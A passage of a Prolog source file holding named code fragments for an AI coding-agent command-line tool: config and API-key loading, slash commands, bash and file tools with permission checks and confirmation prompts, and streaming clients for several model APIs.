    (member(help(Help0), Props) -> Help0 = Help ; Help = '''').

').

%% --- Fragment: config_load_config (config.pl) ---

prolog_fragment(config_load_config, '%% Load config from JSON file
load_config(Path, Config) :-
    (exists_file(Path) ->
        setup_call_cleanup(
            open(Path, read, In),
            json_read_dict(In, Config),
            close(In))
    ; Config = _{}).

').

%% --- Fragment: config_resolve_api_key (config.pl) ---

prolog_fragment(config_resolve_api_key, '%% Resolve API key: check explicit, then env var, then file
resolve_api_key(Backend, Explicit, Key) :-
    (Explicit \\= none -> Key = Explicit
    ; api_key_env_var(Backend, EnvVar),
      getenv(EnvVar, Key), Key \\= '''' -> true
    ; api_key_file(Backend, FilePath),
      expand_file_name(FilePath, [Expanded]),
      exists_file(Expanded),
      read_file_to_string(Expanded, Key0, []),
      normalize_space(atom(Key), Key0) -> true
    ; Key = none).
').

%% --- Fragment: commands_resolve (commands.pl) ---

prolog_fragment(commands_resolve, '%% Resolve aliases — may return "command args" for compound aliases
resolve_command(Input, Command, ExtraArgs) :-
    (command_alias(Input, Canonical) ->
        %% Alias may contain embedded args like "backend yolo"
        (sub_string(Canonical, SpaceIdx, 1, _, " ") ->
            sub_string(Canonical, 0, SpaceIdx, _, CmdPart),
            AfterSpace is SpaceIdx + 1,
            sub_string(Canonical, AfterSpace, _, 0, ExtraArgs),
            atom_string(Command, CmdPart)
        ;
            atom_string(Command, Canonical),
            ExtraArgs = ""
        )
    ; atom_string(Command, Input), ExtraArgs = "").

').

%% --- Fragment: commands_handle_slash (commands.pl) ---

prolog_fragment(commands_handle_slash, '%% Handle a slash command — returns action to take
handle_slash_command(RawCmd, Args, Action) :-
    (atom_concat(''/'', Cmd0, RawCmd) -> true ; Cmd0 = RawCmd),
    atom_string(Cmd0, CmdStr),
    resolve_command(CmdStr, CmdAtom, ExtraArgs),
    %% Merge ExtraArgs with explicit Args
    (ExtraArgs = "" -> FinalArgs = Args
    ; Args = "" -> FinalArgs = ExtraArgs
    ; atom_concat(ExtraArgs, " ", Tmp), atom_concat(Tmp, Args, FinalArgs)),
    (slash_command(CmdAtom, _Match, Opts, _Help) ->
        (member(handler(Handler), Opts) ->
            Action = call_handler(Handler, FinalArgs)
        ; CmdAtom = exit -> Action = exit
        ; CmdAtom = clear -> Action = clear
        ; CmdAtom = help -> Action = help
        ; CmdAtom = status -> Action = status
        ; Action = unknown(CmdAtom))
    ; Action = not_a_command).
').

%% --- Fragment: tools_execute_dispatch (tools.pl) ---

prolog_fragment(tools_execute_dispatch, '%% Execute a tool by name
execute_tool(ToolName, Params, Result) :-
    (tool_handler(ToolName, _) -> true
    ; format(atom(Err), "Unknown tool: ~w", [ToolName]),
      Result = error(Err), !),
    execute_tool_impl(ToolName, Params, Result).

execute_tool_impl(bash, Params, Result) :-
    get_dict(command, Params, Cmd),
    check_command_allowed(Cmd, CmdCheck),
    (CmdCheck = blocked(Reason) ->
        format(atom(BlkErr), "Blocked: ~w", [Reason]),
        Result = error(BlkErr)
    ;
        tool_spec(bash, BashProps),
        (member(timeout(Timeout), BashProps) -> true ; Timeout = 120),
        catch(
            call_with_time_limit(Timeout, (
                setup_call_cleanup(
                    process_create(path(bash), [''-c'', Cmd],
                        [stdout(pipe(Out)), stderr(pipe(Err)), process(PID)]),
                    (read_string(Out, _, StdOut),
                     read_string(Err, _, StdErr),
                     process_wait(PID, Status)),
                    (close(Out), close(Err))),
                (Status = exit(0) ->
                    Result0 = ok(StdOut)
                ;   format(atom(ErrMsg), "Exit ~w: ~w~w", [Status, StdOut, StdErr]),
                    Result0 = error(ErrMsg))
            )),
            time_limit_exceeded,
            (format(atom(TimeErr), "Command timed out after ~w seconds", [Timeout]),
             Result0 = error(TimeErr))
        ),
        Result = Result0
    ).

execute_tool_impl(read, Params, Result) :-
    get_dict(path, Params, FilePath),
    check_path_allowed(FilePath, PathCheck),
    (PathCheck = blocked(Reason) ->
        format(atom(BlkErr), "Blocked: ~w", [Reason]),
        Result = error(BlkErr)
    ; exists_file(FilePath) ->
        read_file_to_string(FilePath, Content, []),
        Result = ok(Content)
    ;   format(atom(Err), "File not found: ~w", [FilePath]),
        Result = error(Err)).

execute_tool_impl(write, Params, Result) :-
    get_dict(path, Params, FilePath),
    get_dict(content, Params, Content),
    check_path_allowed(FilePath, PathCheck),
    (PathCheck = blocked(Reason) ->
        format(atom(BlkErr), "Blocked: ~w", [Reason]),
        Result = error(BlkErr)
    ;
        setup_call_cleanup(
            open(FilePath, write, Out),
            write(Out, Content),
            close(Out)),
        format(atom(Msg), "Wrote ~w", [FilePath]),
        Result = ok(Msg)
    ).

execute_tool_impl(edit, Params, Result) :-
    get_dict(path, Params, FilePath),
    get_dict(old_string, Params, OldStr),
    get_dict(new_string, Params, NewStr),
    check_path_allowed(FilePath, PathCheck),
    (PathCheck = blocked(Reason) ->
        format(atom(BlkErr), "Blocked: ~w", [Reason]),
        Result = error(BlkErr)
    ; exists_file(FilePath) ->
        read_file_to_string(FilePath, Content, []),
        (sub_string(Content, Before, _, After, OldStr) ->
            sub_string(Content, 0, Before, _, Pre),
            Len is Before + (string_length(Content) - Before - After),
            sub_string(Content, Len, After, 0, Post),
            string_concat(Pre, NewStr, Temp),
            string_concat(Temp, Post, NewContent),
            setup_call_cleanup(
                open(FilePath, write, Out),
                write(Out, NewContent),
                close(Out)),
            Result = ok("Edit applied")
        ;   Result = error("Old string not found"))
    ;   format(atom(Err), "File not found: ~w", [FilePath]),
        Result = error(Err)).

').

%% --- Fragment: tools_schema (tools.pl) ---

prolog_fragment(tools_schema, '%% Build JSON Schema input_schema from tool_spec parameters
build_tool_input_schema(ToolName, Schema) :-
    tool_spec(ToolName, Props),
    member(parameters(Params), Props),
    build_properties(Params, PropsDict),
    build_required(Params, ReqList),
    Schema = _{type: "object", properties: PropsDict, required: ReqList}.

build_properties([], _{}).
build_properties([param(Name, Type, _, Desc)|Rest], Props) :-
    build_properties(Rest, RestProps),
    put_dict(Name, RestProps, _{type: Type, description: Desc}, Props).

build_required([], []).
build_required([param(Name, _, required, _)|Rest], [Name|RR]) :-
    build_required(Rest, RR).
build_required([param(_, _, O, _)|Rest], RR) :-
    O \\= required, build_required(Rest, RR).

').

%% --- Fragment: tools_describe (tools.pl) ---

prolog_fragment(tools_describe, '%% Describe a tool call for display
describe_tool_call(Backend, ToolName, Params, Desc) :-
    (tool_description(Backend, ToolName, Verb, ParamKey, Mode) ->
        (get_dict(ParamKey, Params, Val0) -> true ; Val0 = "?"),
        format_tool_value(Mode, Val0, Val),
        format(atom(Desc), "~w ~w", [Verb, Val])
    ; atom_string(ToolName, Desc)).

format_tool_value(basename, Path, Base) :-
    file_base_name(Path, Base).
format_tool_value(raw, Val, Val).
format_tool_value(truncate(Max), Val, Truncated) :-
    string_length(Val, Len),
    (Len > Max ->
        Cut is Max - 3,
        sub_string(Val, 0, Cut, _, Pre),
        string_concat(Pre, "...", Truncated)
    ; Truncated = Val).

').

%% --- Fragment: tools_confirm (tools.pl) ---

prolog_fragment(tools_confirm, '%% Confirm before executing destructive tools
confirm_destructive(ToolName, Approved) :-
    (destructive_tool(ToolName) ->
        format("Tool ''~w'' may modify files. Execute? [y/N] ", [ToolName]),
        read_line_to_string(user_input, Response),
        (member(Response, ["y", "Y", "yes"]) -> Approved = true ; Approved = false)
    ; Approved = true).
').

%% --- Prolog Fragments: backends ---

prolog_fragment(backends_create_backend, '%% Create a backend configuration from factory specs
create_backend(Name, Options, Backend) :-
    (backend_factory(Name, Spec) ->
        Backend = backend{name: Name, spec: Spec, options: Options}
    ; format(atom(Err), "Unknown backend: ~w", [Name]),
      throw(error(Err))).

').

prolog_fragment(backends_retry_config, '%% retry_config(MaxAttempts, BaseDelay, MaxDelay)
retry_config(3, 1.0, 30.0).

%% is_retryable(+Error) — errors worth retrying
is_retryable(error(existence_error(url, _), _)).
is_retryable(error(socket_error(_), _)).
is_retryable(error(timeout_error, _)).
is_retryable(error(_, context(_, status(429, _)))).
is_retryable(error(_, context(_, status(500, _)))).
is_retryable(error(_, context(_, status(502, _)))).
is_retryable(error(_, context(_, status(503, _)))).

').

prolog_fragment(backends_format_api_error, '%% format_api_error(+Error, -Message) — human-readable error description
format_api_error(error(_, context(_, status(429, _))), "Rate limited (429). Will retry.") :- !.
format_api_error(error(_, context(_, status(500, _))), "Internal server error (500)") :- !.
format_api_error(error(_, context(_, status(502, _))), "Bad gateway (502)") :- !.
format_api_error(error(_, context(_, status(503, _))), "Service unavailable (503)") :- !.
format_api_error(error(existence_error(url, URL), _), Msg) :-
    !, format(atom(Msg), "Connection failed: ~w", [URL]).
format_api_error(error(socket_error(E), _), Msg) :-
    !, format(atom(Msg), "Socket error: ~w", [E]).
format_api_error(error(timeout_error, _), "Request timed out") :- !.
format_api_error(Error, Msg) :-
    format(atom(Msg), "Request error: ~w", [Error]).

').

prolog_fragment(backends_retry_call, '%% retry_call(+Goal, +Options) — retry with exponential backoff + jitter
retry_call(Goal, Options) :-
    retry_config(DefaultMax, DefaultBase, DefaultMaxD),
    (member(max_attempts(Max), Options) -> true ; Max = DefaultMax),
    (member(base_delay(Base), Options) -> true ; Base = DefaultBase),
    (member(max_delay(MaxD), Options) -> true ; MaxD = DefaultMaxD),
    retry_call_(Goal, 1, Max, Base, MaxD).

retry_call_(Goal, Attempt, Max, Base, MaxD) :-
    catch(
        call(Goal),
        Error,
        (   Attempt < Max,
            is_retryable(Error) ->
            Delay is min(MaxD, Base * (2 ^ (Attempt - 1))),
            random(Jitter),
            ActualDelay is Delay * (0.5 + Jitter),
            (format_api_error(Error, ErrMsg) -> true ; ErrMsg = "unknown"),
            format("[~w — Retry ~w/~w in ~2fs]~n", [ErrMsg, Attempt, Max, ActualDelay]),
            sleep(ActualDelay),
            NextAttempt is Attempt + 1,
            retry_call_(Goal, NextAttempt, Max, Base, MaxD)
        ;   throw(Error)
        )
    ).

').

prolog_fragment(backends_send_request, '%% Send a request to a backend (with retry) and normalize the response
send_request(Backend, Messages, Tools, Response) :-
    retry_call(
        send_request_inner(Backend, Messages, Tools, Response),
        []).

send_request_inner(Backend, Messages, Tools, Response) :-
    get_dict(spec, Backend, Spec),
    member(resolve_type(Type), Spec),
    catch(
        (send_request_raw(Type, Backend, Messages, Tools, RawResponse),
         extract_response(RawResponse, Response)),
        Error,
        (format_api_error(Error, ErrMsg),
         format("[Error] ~w~n", [ErrMsg]),
         Response = _{content: ErrMsg, tool_calls: [], usage: _{input_tokens: 0, output_tokens: 0}})).

').

prolog_fragment(backends_send_request_raw_api, '%% API backend: HTTP JSON request
send_request_raw(api, Backend, Messages, Tools, Response) :-
    get_dict(spec, Backend, Spec),
    member(endpoint(URL), Spec),
    member(model(Model), Spec),
    get_dict(options, Backend, Opts),
    (member(api_key(Key), Opts) -> true ; Key = none),
    (member(auth_header(AuthH), Spec) -> true ; AuthH = "Authorization"),
    (member(auth_prefix(AuthP), Spec) -> true ; AuthP = "Bearer "),
    atom_concat(AuthP, Key, AuthVal),
    Body = json(_{model: Model, messages: Messages, tools: Tools}),
    setup_call_cleanup(
        http_open(URL, In, [
            method(post),
            request_header(AuthH=AuthVal),
            request_header(''Content-Type''=''application/json''),
            post(Body)
        ]),
        json_read_dict(In, Response),
        close(In)).
send_request_raw(openrouter, B, M, T, R) :- send_request_raw(api, B, M, T, R).
send_request_raw(api_local, B, M, T, R) :- send_request_raw(api, B, M, T, R).

').

prolog_fragment(backends_send_request_raw_cli, '%% CLI backend: subprocess
send_request_raw(cli, Backend, Messages, _Tools, Response) :-
    get_dict(spec, Backend, Spec),
    member(command(Cmd), Spec),
    member(args(BaseArgs), Spec),
    last(Messages, LastMsg),
    get_dict(content, LastMsg, Prompt),
    append(BaseArgs, [Prompt], AllArgs),
    setup_call_cleanup(
        process_create(path(Cmd), AllArgs,
            [stdout(pipe(Out)), stderr(pipe(Err)), process(PID)]),
        (read_string(Out, _, StdOut),
         read_string(Err, _, StdErr),
         process_wait(PID, Status)),
        (close(Out), close(Err))),
    (Status = exit(0) ->
        Response = _{content: StdOut, tool_calls: []}
    ; format(atom(ErrMsg), "Backend exited with ~w: ~w", [Status, StdErr]),
        Response = _{content: ErrMsg, tool_calls: []}).

').

prolog_fragment(backends_extract_response, '%% Extract and normalize API response to _{content, tool_calls, usage}
extract_response(Raw, Normalized) :-
    extract_usage(Raw, Usage),
    (get_dict(choices, Raw, Choices) ->
        %% OpenAI/OpenRouter format
        Choices = [FirstChoice|_],
        get_dict(message, FirstChoice, Msg),
        (get_dict(content, Msg, Content0) -> true ; Content0 = ""),
        (Content0 = null -> Content = "" ; Content = Content0),
        (get_dict(tool_calls, Msg, TCs) ->
            maplist(normalize_openai_tc, TCs, ToolCalls)
        ; ToolCalls = []),
        Normalized = _{content: Content, tool_calls: ToolCalls, usage: Usage}
    ; get_dict(content, Raw, ContentList), is_list(ContentList) ->
        %% Anthropic format — content is a list of blocks
        extract_anthropic(ContentList, Content, ToolCalls),
        Normalized = _{content: Content, tool_calls: ToolCalls, usage: Usage}
    ; %% Already normalized (e.g., CLI backend)
        (get_dict(content, Raw, _) -> Normalized = Raw.put(usage, Usage)
        ; Normalized = Raw.put(usage, Usage))).

%% Normalize OpenAI tool call format
normalize_openai_tc(TC, Normalized) :-
    get_dict(id, TC, Id),
    get_dict(function, TC, Func),
    get_dict(name, Func, Name),
    get_dict(arguments, Func, ArgsJson),
    (is_dict(ArgsJson) -> Args = ArgsJson
    ; atom_to_term(ArgsJson, Args, _)),
    Normalized = _{id: Id, name: Name, arguments: Args}.

%% Extract Anthropic content blocks
extract_anthropic(Blocks, Content, ToolCalls) :-
    findall(Text, (
        member(B, Blocks), get_dict(type, B, "text"),
        get_dict(text, B, Text)
    ), Texts),
    atomic_list_concat(Texts, Content),
    findall(TC, (
        member(B, Blocks), get_dict(type, B, "tool_use"),
        get_dict(id, B, Id), get_dict(name, B, Name),
        get_dict(input, B, Input),
        TC = _{id: Id, name: Name, arguments: Input}
    ), ToolCalls).

%% Extract usage/token counts from API response
extract_usage(Raw, Usage) :-
    (get_dict(usage, Raw, U) ->
        (get_dict(prompt_tokens, U, InTok) -> true
        ; get_dict(input_tokens, U, InTok) -> true
        ; InTok = 0),
        (get_dict(completion_tokens, U, OutTok) -> true
        ; get_dict(output_tokens, U, OutTok) -> true
        ; OutTok = 0),
        Usage = _{input_tokens: InTok, output_tokens: OutTok}
    ;
        Usage = _{input_tokens: 0, output_tokens: 0}
    ).

').

prolog_fragment(backends_streaming_dispatch, '%% Send a streaming request (falls back to send_request if unsupported)
send_request_streaming(Backend, Messages, Tools, Response) :-
    get_dict(spec, Backend, Spec),
    member(resolve_type(Type), Spec),
    (streaming_capable(Type) ->
        send_request_streaming_raw(Type, Backend, Messages, Tools, Response)
    ;
        send_request(Backend, Messages, Tools, Response)
    ).

').

prolog_fragment(backends_streaming_ndjson, '%% Streaming for api_local (Ollama): NDJSON format
%% Each line is a JSON object: {"message":{"content":"token"},"done":false}
send_request_streaming_raw(api_local, Backend, Messages, _Tools, Response) :-
    get_dict(spec, Backend, Spec),
    member(endpoint(BaseURL), Spec),
    get_dict(options, Backend, Opts),
    (member(model(Model), Opts) -> true
    ; member(model(Model), Spec) -> true
    ; Model = "llama3"),
    Body = json(_{model: Model, messages: Messages, stream: true}),
    setup_call_cleanup(
        http_open(BaseURL, In, [
            method(post),
            request_header(''Content-Type''=''application/json''),
            post(Body)
        ]),
        read_ndjson_stream(In, Content, Usage),
        close(In)),
    Response = _{content: Content, tool_calls: [], usage: Usage}.

%% Read NDJSON stream line by line, printing tokens as they arrive
read_ndjson_stream(In, Content, Usage) :-
    read_ndjson_stream(In, [], 0, 0, Content, Usage).

read_ndjson_stream(In, Acc, InToks, OutToks, Content, Usage) :-
    (at_end_of_stream(In) ->
        reverse(Acc, Tokens),
        atomic_list_concat(Tokens, Content),
        Usage = _{input_tokens: InToks, output_tokens: OutToks}
    ;
        read_line_to_string(In, Line),
        (Line = end_of_file ->
            reverse(Acc, Tokens),
            atomic_list_concat(Tokens, Content),
            Usage = _{input_tokens: InToks, output_tokens: OutToks}
        ;
            catch(
                (open_string(Line, StrIn),
                 json_read_dict(StrIn, Dict),
                 close(StrIn)),
                _, (Dict = _{done: false})),
            %% Check for usage in final chunk
            (get_dict(done, Dict, true) ->
                (get_dict(prompt_eval_count, Dict, PEC) -> NewIn = PEC ; NewIn = InToks),
                (get_dict(eval_count, Dict, EC) -> NewOut = EC ; NewOut = OutToks),
                reverse(Acc, Tokens2),
                atomic_list_concat(Tokens2, Content),
                Usage = _{input_tokens: NewIn, output_tokens: NewOut}
            ;
                (get_dict(message, Dict, Msg), get_dict(content, Msg, Token) -> true ; Token = ""),
                (Token \\= "" ->
                    write(Token), flush_output,
                    read_ndjson_stream(In, [Token|Acc], InToks, OutToks, Content, Usage)
                ;
                    read_ndjson_stream(In, Acc, InToks, OutToks, Content, Usage)
                )
            )
        )
    ).

').

prolog_fragment(backends_streaming_openai, '%% SSE streaming for API backends — dispatches by auth type
send_request_streaming_raw(api, Backend, Messages, Tools, Response) :-
    get_dict(spec, Backend, Spec),
    (member(auth_header("x-api-key"), Spec) ->
        send_request_streaming_anthropic(Backend, Messages, Tools, Response)
    ;
        send_request_streaming_openai(Backend, Messages, Tools, Response)
    ).

%% OpenRouter delegates to api SSE
send_request_streaming_raw(openrouter, B, M, T, R) :-
    send_request_streaming_raw(api, B, M, T, R).

%% OpenAI-format SSE streaming
send_request_streaming_openai(Backend, Messages, Tools, Response) :-
    get_dict(spec, Backend, Spec),
    member(endpoint(URL), Spec),
    member(model(Model), Spec),
    get_dict(options, Backend, Opts),
    (member(api_key(Key), Opts) -> true ; Key = none),
    (member(auth_header(AuthH), Spec) -> true ; AuthH = "Authorization"),
    (member(auth_prefix(AuthP), Spec) -> true ; AuthP = "Bearer "),
    atom_concat(AuthP, Key, AuthVal),
    Body = json(_{model: Model, messages: Messages, tools: Tools,
                  stream: true, stream_options: _{include_usage: true}}),
    setup_call_cleanup(
        http_open(URL, In, [
            method(post),
            request_header(AuthH=AuthVal),
            request_header(''Content-Type''=''application/json''),
            post(Body)
        ]),
        read_sse_stream(In, Content, ToolCalls, Usage),
        close(In)),
    Response = _{content: Content, tool_calls: ToolCalls, usage: Usage}.

').

prolog_fragment(backends_streaming_anthropic, '%% Anthropic-format SSE streaming
send_request_streaming_anthropic(Backend, Messages, Tools, Response) :-
    get_dict(spec, Backend, Spec),
    member(endpoint(URL), Spec),
    member(model(Model), Spec),
    get_dict(options, Backend, Opts),
    (member(api_key(Key), Opts) -> true ; Key = none),
    %% Extract system prompt from messages
    (Messages = [SysMsg|RestMsgs],
     get_dict(role, SysMsg, "system"),
     get_dict(content, SysMsg, SysContent) ->
        System = SysContent, UserMsgs = RestMsgs
    ;
        System = "", UserMsgs = Messages),
    %% Build tool definitions for Anthropic format
    (Tools \\= [] ->
        maplist([T, AT]>>(
            get_dict(name, T, TN),
            get_dict(description, T, TD),
            (get_dict(input_schema, T, TIS) -> true ; TIS = _{type: "object", properties: _{}}),
            AT = _{name: TN, description: TD, input_schema: TIS}
        ), Tools, AnthTools),
        Body0 = _{model: Model, messages: UserMsgs, tools: AnthTools,
                   max_tokens: 4096, stream: true}
    ;
        Body0 = _{model: Model, messages: UserMsgs,
                   max_tokens: 4096, stream: true}),
    (System \\= "" -> Body = Body0.put(system, System) ; Body = Body0),
    setup_call_cleanup(
        http_open(URL, In, [
            method(post),
            request_header(''x-api-key''=Key),
            request_header(''anthropic-version''=''2023-06-01''),
            request_header(''Content-Type''=''application/json''),
            post(json(Body))
        ]),
        read_anthropic_sse_stream(In, Content, ToolCalls, Usage),
        close(In)),
    Response = _{content: Content, tool_calls: ToolCalls, usage: Usage}.

%% Anthropic SSE stream parser
read_anthropic_sse_stream(In, Content, ToolCalls, Usage) :-
    read_anthropic_sse_stream(In, [], [], 0, 0, [], Content, ToolCalls, Usage).

read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, OutToks, CurTool,
                          Content, ToolCalls, Usage) :-
    (at_end_of_stream(In) ->
        reverse(TokAcc, Tokens),
        atomic_list_concat(Tokens, Content),
        reverse(TCAcc, ToolCalls),
        Usage = _{input_tokens: InToks, output_tokens: OutToks}
    ;
        read_line_to_string(In, Line),
        (Line = end_of_file ->
            reverse(TokAcc, Tokens),
            atomic_list_concat(Tokens, Content),
            reverse(TCAcc, ToolCalls),
            Usage = _{input_tokens: InToks, output_tokens: OutToks}
        ; sub_string(Line, 0, 6, _, "data: ") ->
            sub_string(Line, 6, _, 0, Payload),
            catch(
                (open_string(Payload, StrIn),
                 json_read_dict(StrIn, Evt),
                 close(StrIn)),
                _, (Evt = null)),
            (Evt \\= null ->
                handle_anthropic_event(Evt, In, TokAcc, TCAcc, InToks, OutToks, CurTool,
                                       Content, ToolCalls, Usage)
            ;
                read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, OutToks, CurTool,
                                          Content, ToolCalls, Usage)
            )
        ;
            read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, OutToks, CurTool,
                                      Content, ToolCalls, Usage)
        )
    ).

%% Handle individual Anthropic SSE events
handle_anthropic_event(Evt, In, TokAcc, TCAcc, InToks, OutToks, CurTool,
                       Content, ToolCalls, Usage) :-
    get_dict(type, Evt, Type),
    (Type = "message_start" ->
        (get_dict(message, Evt, Msg),
         get_dict(usage, Msg, MUsage),
         get_dict(input_tokens, MUsage, NewInToks) -> true
        ; NewInToks = InToks),
        read_anthropic_sse_stream(In, TokAcc, TCAcc, NewInToks, OutToks, CurTool,
                                  Content, ToolCalls, Usage)
    ; Type = "content_block_start" ->
        get_dict(content_block, Evt, CB),
        (get_dict(type, CB, "tool_use") ->
            get_dict(id, CB, TId),
            get_dict(name, CB, TName),
            read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, OutToks,
                                      tool_state(TId, TName, []),
                                      Content, ToolCalls, Usage)
        ;
            read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, OutToks, CurTool,
                                      Content, ToolCalls, Usage)
        )
    ; Type = "content_block_delta" ->
        get_dict(delta, Evt, Delta),
        get_dict(type, Delta, DType),
        (DType = "text_delta" ->
            get_dict(text, Delta, Token),
            write(Token), flush_output,
            read_anthropic_sse_stream(In, [Token|TokAcc], TCAcc, InToks, OutToks, CurTool,
                                      Content, ToolCalls, Usage)
        ; DType = "input_json_delta" ->
            get_dict(partial_json, Delta, Fragment),
            (CurTool = tool_state(CTId, CTName, CTFrags) ->
                NewCurTool = tool_state(CTId, CTName, [Fragment|CTFrags])
            ; NewCurTool = CurTool),
            read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, OutToks, NewCurTool,
                                      Content, ToolCalls, Usage)
        ;
            read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, OutToks, CurTool,
                                      Content, ToolCalls, Usage)
        )
    ; Type = "content_block_stop" ->
        (CurTool = tool_state(CSId, CSName, CSFrags) ->
            reverse(CSFrags, FragsOrdered),
            atomic_list_concat(FragsOrdered, JsonStr),
            (JsonStr = "" -> Args = _{}
            ; catch(
                (open_string(JsonStr, JIn), json_read_dict(JIn, Args), close(JIn)),
                _, Args = _{})),
            TC = _{id: CSId, name: CSName, arguments: Args},
            read_anthropic_sse_stream(In, TokAcc, [TC|TCAcc], InToks, OutToks, [],
                                      Content, ToolCalls, Usage)
        ;
            read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, OutToks, [],
                                      Content, ToolCalls, Usage)
        )
    ; Type = "message_delta" ->
        (get_dict(usage, Evt, DUsage),
         get_dict(output_tokens, DUsage, NewOutToks) -> true
        ; NewOutToks = OutToks),
        read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, NewOutToks, CurTool,
                                  Content, ToolCalls, Usage)
    ; Type = "message_stop" ->
        reverse(TokAcc, Tokens),
        atomic_list_concat(Tokens, Content),
        reverse(TCAcc, ToolCalls),
        Usage = _{input_tokens: InToks, output_tokens: OutToks}
    ;
        read_anthropic_sse_stream(In, TokAcc, TCAcc, InToks, OutToks, CurTool,
                                  Content, ToolCalls, Usage)
    ).

').

prolog_fragment(backends_tc_delta, '%% Accumulate OpenAI tool call deltas by index
accumulate_tc_delta(DeltaTC, Acc, NewAcc) :-
    get_dict(index, DeltaTC, Idx),
    (get_dict(function, DeltaTC, Func) -> true ; Func = _{}),
    (get_dict(id, DeltaTC, Id0) -> true ; Id0 = none),
    (get_dict(name, Func, Name0) -> true ; Name0 = none),
    (get_dict(arguments, Func, ArgFrag) -> true ; ArgFrag = ""),
    length(Acc, CurLen),
    (Idx < CurLen ->
        nth0(Idx, Acc, tc_state(ExId, ExName, ExFrags)),
        (Id0 \\= none -> NId = Id0 ; NId = ExId),
        (Name0 \\= none -> NName = Name0 ; NName = ExName),
        (ArgFrag \\= "" -> NFrags = [ArgFrag|ExFrags] ; NFrags = ExFrags),
        replace_nth0(Idx, Acc, tc_state(NId, NName, NFrags), NewAcc)
    ;
        (Id0 \\= none -> FId = Id0 ; FId = ""),
        (Name0 \\= none -> FName = Name0 ; FName = ""),
        (ArgFrag \\= "" -> Frags0 = [ArgFrag] ; Frags0 = []),
        append(Acc, [tc_state(FId, FName, Frags0)], NewAcc)
    ).

replace_nth0(0, [_|Rest], Elem, [Elem|Rest]) :- !.
replace_nth0(N, [H|Rest], Elem, [H|Result]) :-
    N > 0, N1 is N - 1,
    replace_nth0(N1, Rest, Elem, Result).

%% Finalize tool call accumulators into normalized dicts
finalize_tc_acc([], []) :- !.
finalize_tc_acc([tc_state(_,_,_)|_] = Acc, ToolCalls) :- !,
    maplist(finalize_one_tc, Acc, ToolCalls).
finalize_tc_acc(Acc, ToolCalls) :- reverse(Acc, ToolCalls).

finalize_one_tc(tc_state(Id, Name, RevFrags), TC) :-
    reverse(RevFrags, Frags),
    atomic_list_concat(Frags, JsonStr),
    (JsonStr = "" -> Args = _{}
    ; catch(
        (open_string(JsonStr, JIn), json_read_dict(JIn, Args), close(JIn)),
        _, Args = _{})),
    TC = _{id: Id, name: Name, arguments: Args}.

').

prolog_fragment(backends_sse_parser, '%% SSE stream parser — reads "data: <json>" lines
read_sse_stream(In, Content, ToolCalls, Usage) :-
    read_sse_stream(In, [], [], 0, 0, Content, ToolCalls, Usage).

read_sse_stream(In, TokenAcc, TCAcc, InToks, OutToks, Content, ToolCalls, Usage) :-
    (at_end_of_stream(In) ->
        reverse(TokenAcc, Tokens),
        atomic_list_concat(Tokens, Content),
        finalize_tc_acc(TCAcc, ToolCalls),
        Usage = _{input_tokens: InToks, output_tokens: OutToks}
    ;
        read_line_to_string(In, Line),
        (Line = end_of_file ->
            reverse(TokenAcc, Tokens),
            atomic_list_concat(Tokens, Content),
            finalize_tc_acc(TCAcc, ToolCalls),
            Usage = _{input_tokens: InToks, output_tokens: OutToks}
        ; sub_string(Line, 0, 6, _, "data: ") ->
            sub_string(Line, 6, _, 0, Payload),
            (Payload = "[DONE]" ->
                reverse(TokenAcc, Tokens),
                atomic_list_concat(Tokens, Content),
                finalize_tc_acc(TCAcc, ToolCalls),
                Usage = _{input_tokens: InToks, output_tokens: OutToks}
            ;
                catch(
                    (open_string(Payload, StrIn),
                     json_read_dict(StrIn, Chunk),
                     close(StrIn)),
                    _, (Chunk = null)),
                %% Check for usage in chunk
                (Chunk \\= null, get_dict(usage, Chunk, CUsage) ->
                    (get_dict(prompt_tokens, CUsage, NIn) -> true ; NIn = InToks),
                    (get_dict(completion_tokens, CUsage, NOut) -> true ; NOut = OutToks),
                    read_sse_stream(In, TokenAcc, TCAcc, NIn, NOut, Content, ToolCalls, Usage)
                ; Chunk \\= null,
                  get_dict(choices, Chunk, Choices),
                  Choices = [Choice|_],
                  get_dict(delta, Choice, Delta) ->
                    (get_dict(content, Delta, Token), Token \\= null ->
                        write(Token), flush_output,
                        read_sse_stream(In, [Token|TokenAcc], TCAcc, InToks, OutToks, Content, ToolCalls, Usage)
                    ; get_dict(tool_calls, Delta, DeltaTCs) ->
                        foldl(accumulate_tc_delta, DeltaTCs, TCAcc, NewTCAcc),
                        read_sse_stream(In, TokenAcc, NewTCAcc, InToks, OutToks, Content, ToolCalls, Usage)
                    ;
                        read_sse_stream(In, TokenAcc, TCAcc, InToks, OutToks, Content, ToolCalls, Usage)
                    )
                ;
                    read_sse_stream(In, TokenAcc, TCAcc, InToks, OutToks, Content, ToolCalls, Usage)
                )
            )
        ;
            %% Skip non-data lines
            read_sse_stream(In, TokenAcc, TCAcc, InToks, OutToks, Content, ToolCalls, Usage)
        )
    ).
').

%% --- Prolog Fragments: agent_loop ---

prolog_fragment(agent_loop_init_state, 'conversation([]).
max_iterations(0).
current_format(plain).
streaming(false).
context_max_tokens(100000).
context_max_messages(50).
:- dynamic chars_per_token/1.
chars_per_token(4.0).
:- dynamic ansi_enabled/1.
ansi_enabled(true).
:- initialization((getenv(''NO_COLOR'', _) -> retractall(ansi_enabled(_)), assert(ansi_enabled(false)) ; true)).
ansi_code(reset,   "\\033[0m").
ansi_code(bold,    "\\033[1m").
ansi_code(dim,     "\\033[2m").
ansi_code(red,     "\\033[31m").
ansi_code(green,   "\\033[32m").
ansi_code(yellow,  "\\033[33m").
ansi_code(cyan,    "\\033[36m").
ansi_format(Style, Fmt, Args) :-
    (ansi_enabled(true), ansi_code(Style, Code), ansi_code(reset, Reset) ->
        atom_string(CodeA, Code), atom_string(ResetA, Reset),
        atomic_list_concat([CodeA, Fmt, ResetA], FullFmt),
        format(FullFmt, Args)
    ; format(Fmt, Args)).

:- det(sessions_dir/1).
:- det(agent_loop/0).
:- det(agent_loop/1).
:- det(read_input_smart/1).
:- det(process_input/2).
:- det(handle_response/4).
:- det(handle_tool_calls/4).

